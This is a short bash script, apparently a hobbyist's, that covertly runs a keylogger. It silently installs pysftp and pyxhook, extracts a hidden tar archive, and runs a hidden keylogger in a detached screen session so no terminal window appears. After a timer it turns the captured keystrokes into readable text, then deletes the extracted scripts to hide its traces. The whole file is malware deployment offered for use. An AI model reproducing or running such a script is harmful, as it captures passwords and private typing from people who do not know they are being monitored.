#!/bin/bash

# will be used to install packages that are needed
# this hides the verbose outputs, -quiet doesnt 
# always work, so i redirected to .hidden and remove it
pip3 -q install pysftp > /dev/null
pip3 -q install pyxhook > /dev/null

#=======================#
tar xf .logger.tar
#=======================#
# - .keylogger.py     -----> logs different keys as events in ./file.log          ##TODO## pick up keylog from terminal
# - .event_translater.py --> translates each key to become a full string of text
#=======================#

# runs the key logger as a background process. This
# allows the timer to go off below
#
# screen -d -m prevents the terminal from appearing
# 
# as of now, I am not sure if this really makes a
# difference, but ill leave it here since im prob
# gonna forget about screen -d -m. its supposed to
# exit out the terminal and run behind the OS.
screen -d -m python3 .keylogger.py &

# timer set to n seconds
timer=10

while [ $timer -gt 0 ]
    do sleep 1s 
    timer=$(($timer - 1))
done

# kills the python3 process after timer
killall python3

# .event_translater will take the file.log and make it into strings
# instead of character inputs, then overwrites the original .file.log
# 
# If the keylogger did not pick up any keys, the translater will not
# used.

# cp .file.log log_cpy.txt  # <--- used to make a copy of the event log before the translated text

if [ -e ./.file.log ]
then
    python3 .event_translater.py
fi

# removes files that have been extracted from .logger.tar
rm .keylogger.py .event_translater.py
# rm -f .autologger.sh
